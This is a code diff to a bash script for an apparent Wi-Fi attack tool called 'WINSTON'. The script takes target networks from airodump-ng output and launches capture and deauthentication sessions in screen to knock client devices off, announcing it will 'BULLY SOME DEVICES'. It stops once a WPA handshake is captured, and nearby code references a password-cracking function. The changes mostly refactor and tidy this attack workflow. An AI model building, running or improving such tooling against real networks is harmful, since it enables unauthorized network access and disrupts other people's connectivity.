@@ -47,6 +47,24 @@ crack_password() {
     fi
 }
 
+# Function to start capture screen
+start_capture_screen() {
+    if screen -ls | grep -q "capture"; then
+        screen -X -S capture quit
+    fi
+    screen -dmS capture ./capture.sh
+    echo "WINSTON: CAPTURE SCREEN STARTED"
+}
+
+# Function to start deauth screen
+start_deauth_screen() {
+    if screen -ls | grep -q "deauth"; then
+        screen -X -S deauth quit
+    fi
+    screen -dmS deauth ./deauth.sh
+    echo "WINSTON: DEAUTH SCREEN STARTED"
+}
+
 # Main authentication loop
 while true; 
 do
@@ -114,8 +132,7 @@ through=$(($through))
 while true; do
     if [[ $through -gt 1 ]]; then
         clear
-        echo "WINSTON: HERE'S YOUR OPTIONS
-    "
+        echo "WINSTON: HERE'S YOUR OPTIONS"
         echo "$(cat /winston/kenel/airodump-ng-01.csv | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+' | grep -v IP)" > /winston/kenel/network_options.txt
         options=/winston/kenel/network_options.txt
         lines=$(cat $options | wc -l 2>/dev/null)
@@ -126,8 +143,7 @@ while true; do
                 echo "[$i] $(cat $options | sed -n ${i}p)"
             fi
         done
-        echo "WINSTON: PLEASE PICK AN OPTION
-        "
+        echo "WINSTON: PLEASE PICK AN OPTION"
         read -p "$username: " line
         line=$(($line))
         if [[ $line -ge 1 && $line -lt $(($lines + 1)) ]]; then
@@ -135,15 +151,13 @@ while true; do
             name="$(cat /winston/kenel/airodump-ng-01.csv | grep $option | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
             break
         elif [ $line -eq $(($lines + 1)) ]; then
-            echo "WINSTON: PLEASE WAIT
-        "
+            echo "WINSTON: PLEASE WAIT"
             sleep 10
             continue
         fi
         break
     elif [[ $through -eq 1 ]]; then
-        echo "WINSTON: INITIALIZING
-        "
+        echo "WINSTON: INITIALIZING"
         through=$(($through + 1))
         sleep 5s
         continue
@@ -165,35 +179,34 @@ ssid: $bssid
 channel: $channel
 interface: $interface" > /winston/kenel/network_settings
 
-if ! screen -ls | grep capture 2>/dev/null; then
-    screen -dmS capture ./capture.sh &
-elif screen -ls | grep capture 2>/dev/null; then
-    screen kill $(screen -ls | grep capture | awk {'print $1'} | grep -oe '[0-9]\+') &>/dev/null
-    clear
-fi
+# Start capture screen
+start_capture_screen
 
-echo "WINSTON: PLEASE WAIT WHILE WE PREPARE TO BULLY SOME DEVICES.
-"
+echo "WINSTON: PLEASE WAIT WHILE WE PREPARE TO BULLY SOME DEVICES."
 
 while true; do
     sleep 5s
     if ! cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[A-F0-9:]\+'; then
         clear
-        echo "WINSTON: PLEASE WAIT
-        "
+        echo "WINSTON: PLEASE WAIT"
     elif cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[0-9aA-F:]\+'; then
         doptions=$(cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[A-Z0-9:]\+')
         echo "$doptions"
-        echo "$dtoptions" > /winston/kenel/device_options
+        echo "$doptions" > /winston/kenel/device_options
         break
     fi
 done
 
+# Start deauth screen
+start_deauth_screen
+
 while true; do
     if cat /winston/kenel/psk-01.csv | awk -F, '$6 ~ /WPA/ {print $1}' | grep -E "^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}"; then
-        pid=$(screen -ls | grep "(" | awk {'print $1'} | grep -oe '[0-9]\+')
-        screen kill $pid
-        echo "we got it"
+        # Kill capture screen
+        screen -X -S capture quit
+        # Kill deauth screen
+        screen -X -S deauth quit
+        echo "WINSTON: HANDSHAKE CAPTURED!"
         break
     else
         continue
